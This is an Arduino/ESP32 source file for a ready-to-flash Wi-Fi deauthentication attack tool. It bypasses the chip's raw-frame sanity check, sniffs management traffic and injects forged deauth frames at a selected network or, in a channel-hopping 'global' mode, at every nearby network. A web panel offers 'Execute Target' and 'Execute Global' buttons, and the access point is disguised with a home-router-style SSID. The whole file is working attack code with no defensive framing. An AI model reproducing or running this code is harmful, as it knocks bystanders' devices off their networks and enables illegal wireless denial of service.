#include <WiFi.h>
#include <esp_wifi.h>
#include <WebServer.h>

// --- Configuration ---
const char* AP_SSID = "PLDTHOME82993";
const char* AP_PASS = "@deauther";

#define LED 2           
#define CHANNEL_MAX 11  

// --- Types & Definitions ---
#define DEAUTH_TYPE_SINGLE 0
#define DEAUTH_TYPE_ALL    1

typedef struct {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t dest[6];
  uint8_t src[6];
  uint8_t bssid[6];
  uint16_t seq_ctrl;
  uint16_t reason;
} deauth_frame_t;

typedef struct {
  uint8_t frame_ctrl[2];
  uint8_t duration[2];
  uint8_t dest[6];
  uint8_t src[6];
  uint8_t bssid[6];
  uint8_t seq_ctrl[2];
} mac_hdr_t;

typedef struct {
  mac_hdr_t hdr;
  uint8_t payload[0];
} wifi_packet_t;

// --- Global Variables ---
WebServer server(80);
deauth_frame_t deauth_frame;
int deauth_type = -1; 
int num_networks = 0;
int curr_channel = 1;
int eliminated_stations = 0;
bool attacking = false;

wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };

void start_deauth(int wifi_number, int attack_type, uint16_t reason);
void stop_deauth();

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) { return 0; }

IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (!attacking) return;
  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
  const mac_hdr_t *mac_header = &packet->hdr;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(mac_header->dest, deauth_frame.bssid, 6) == 0) {
      memcpy(deauth_frame.dest, mac_header->src, 6);
      for (int i = 0; i < 3; i++) esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
      eliminated_stations++;
    }
  } else if (deauth_type == DEAUTH_TYPE_ALL) {
    if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
      memcpy(deauth_frame.dest, mac_header->src, 6);
      memcpy(deauth_frame.src, mac_header->bssid, 6);
      memcpy(deauth_frame.bssid, mac_header->bssid, 6);
      for (int i = 0; i < 3; i++) esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
      eliminated_stations++;
    }
  }
  digitalWrite(LED, !digitalRead(LED));
}

String getEncryptionType(wifi_auth_mode_t type) {
  switch (type) {
    case WIFI_AUTH_OPEN: return "Open";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
    default: return "Other";
  }
}

void handle_root() {
  String html = R"(
<!DOCTYPE html><html><head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>
<title>Network Console</title>
<style>
  :root { --bg: #0f172a; --card: #1e293b; --accent: #38bdf8; --text: #f1f5f9; --danger: #f43f5e; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 15px; -webkit-tap-highlight-color: transparent; }
  .wrapper { max-width: 1000px; margin: auto; }
  header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; padding-bottom: 10px; margin-bottom: 20px; }
  h1 { font-size: 1.5rem; color: var(--accent); margin: 0; }
  .stats-box { background: var(--card); padding: 15px; border-radius: 12px; border-left: 4px solid var(--accent); margin-bottom: 20px; font-weight: 500; }
  .table-container { background: var(--card); border-radius: 12px; overflow-x: auto; margin-bottom: 20px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.3); }
  table { width: 100%; border-collapse: collapse; min-width: 600px; }
  th { background: #334155; color: var(--accent); text-align: left; padding: 12px; font-size: 0.85rem; text-transform: uppercase; }
  td { padding: 12px; border-bottom: 1px solid #334155; font-size: 0.9rem; }
  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
  @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
  .card { background: var(--card); padding: 20px; border-radius: 12px; box-sizing: border-box; }
  h3 { margin-top: 0; font-size: 1.1rem; border-bottom: 1px solid #334155; padding-bottom: 8px; }
  input { background: #0f172a; border: 1px solid #334155; color: white; padding: 12px; border-radius: 8px; width: 100%; margin-bottom: 12px; box-sizing: border-box; font-size: 16px; }
  input:focus { border-color: var(--accent); outline: none; }
  .btn { display: block; width: 100%; padding: 14px; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; transition: 0.2s; text-align: center; text-decoration: none; font-size: 0.95rem; }
  .btn-blue { background: var(--accent); color: #0f172a; }
  .btn-red { background: var(--danger); color: white; }
  .btn-ghost { background: transparent; border: 1px solid #334155; color: var(--text); margin-top: 10px; }
  .btn:active { transform: scale(0.98); opacity: 0.8; }
</style></head><body><div class='wrapper'>
<header><h1>Console</h1></header>
<div class='stats-box'>Packets Dispatched: )" + String(eliminated_stations) + R"(</div>
<div class='table-container'>
  <table><tr><th>ID</th><th>SSID</th><th>BSSID</th><th>CH</th><th>RSSI</th><th>SEC</th></tr>)";

  for (int i = 0; i < num_networks; i++) {
    html += "<tr><td>" + String(i) + "</td><td>" + WiFi.SSID(i) + "</td><td>" + WiFi.BSSIDstr(i) + 
            "</td><td>" + String(WiFi.channel(i)) + "</td><td>" + String(WiFi.RSSI(i)) + 
            "</td><td>" + getEncryptionType(WiFi.encryptionType(i)) + "</td></tr>";
  }

  html += R"(</table></div>
<form method='POST' action='/rescan'><button class='btn btn-blue' style='margin-bottom:20px;'>Refresh Networks</button></form>
<div class='grid'>
  <div class='card'>
    <h3>Individual Target</h3>
    <form method='POST' action='/deauth'>
      <input type='number' name='net_num' placeholder='Network ID' required>
      <input type='number' name='reason' placeholder='Reason (e.g. 1)' value='1'>
      <button class='btn btn-red'>Execute Target</button>
    </form>
  </div>
  <div class='card'>
    <h3>Global Broadcast</h3>
    <form method='POST' action='/deauth_all'>
      <input type='number' name='reason' placeholder='Reason (e.g. 1)' value='1'>
      <button class='btn btn-red'>Execute Global</button>
    </form>
  </div>
</div>
<form method='POST' action='/stop'><button class='btn btn-ghost'>Emergency Stop</button></form>
</div></body></html>)";

  server.send(200, "text/html", html);
}

void handle_deauth() {
  int net = server.arg("net_num").toInt();
  uint16_t res = server.arg("reason").toInt();
  if (res == 0) res = 1;
  start_deauth(net, DEAUTH_TYPE_SINGLE, res);
  server.sendHeader("Location", "/");
  server.send(302);
}

void handle_deauth_all() {
  uint16_t res = server.arg("reason").toInt();
  if (res == 0) res = 1;
  server.send(200, "text/html", "Executing Global... System UI disconnected. Reset hardware to restore.");
  delay(500);
  start_deauth(0, DEAUTH_TYPE_ALL, res);
}

void handle_stop() {
  stop_deauth();
  server.sendHeader("Location", "/");
  server.send(302);
}

void handle_rescan() {
  num_networks = WiFi.scanNetworks();
  server.sendHeader("Location", "/");
  server.send(302);
}

void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
  stop_deauth();
  deauth_type = attack_type;
  eliminated_stations = 0;
  deauth_frame.frame_ctrl = 0xC0;
  deauth_frame.duration = 0;
  deauth_frame.seq_ctrl = 0;
  deauth_frame.reason = reason;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    int ch = WiFi.channel(wifi_number);
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    memcpy(deauth_frame.src, WiFi.BSSID(wifi_number), 6);
    memcpy(deauth_frame.bssid, WiFi.BSSID(wifi_number), 6);
  }

  attacking = true;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
}

void stop_deauth() {
  attacking = false;
  esp_wifi_set_promiscuous(false);
  digitalWrite(LED, LOW);
}

void setup() {
  pinMode(LED, OUTPUT);
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.softAP(AP_SSID, AP_PASS);
  server.on("/", handle_root);
  server.on("/deauth", HTTP_POST, handle_deauth);
  server.on("/deauth_all", HTTP_POST, handle_deauth_all);
  server.on("/rescan", HTTP_POST, handle_rescan);
  server.on("/stop", HTTP_POST, handle_stop);
  server.begin();
  num_networks = WiFi.scanNetworks();
}

void loop() {
  if (attacking && deauth_type == DEAUTH_TYPE_ALL) {
    curr_channel++;
    if (curr_channel > CHANNEL_MAX) curr_channel = 1;
    esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
    delay(40); 
  } else {
    server.handleClient();
  }
}
